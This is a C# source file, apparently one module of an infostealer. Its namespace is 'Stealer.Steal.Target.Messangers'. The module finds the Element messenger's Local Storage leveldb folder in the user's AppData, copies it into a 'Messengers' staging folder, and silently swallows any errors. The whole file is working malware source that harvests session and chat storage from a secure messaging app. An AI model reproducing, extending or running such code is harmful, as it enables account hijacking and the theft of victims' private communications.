using System;
using System.IO;
using Stealer.Steal.Helper;

namespace Stealer.Steal.Target.Messangers;

internal class Element
{
	private static string ElementPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Element\\Local Storage");

	public static void Start()
	{
		try
		{
			if (Directory.Exists(ElementPath))
			{
				string text = Path.Combine(ElementPath, "leveldb");
				if (Directory.Exists(text))
				{
					Counter.Element = true;
					DynamicFiles.CopyDirectory(text, Path.Combine("Messengers", "Element", "leveldb"));
				}
			}
		}
		catch
		{
		}
	}
}
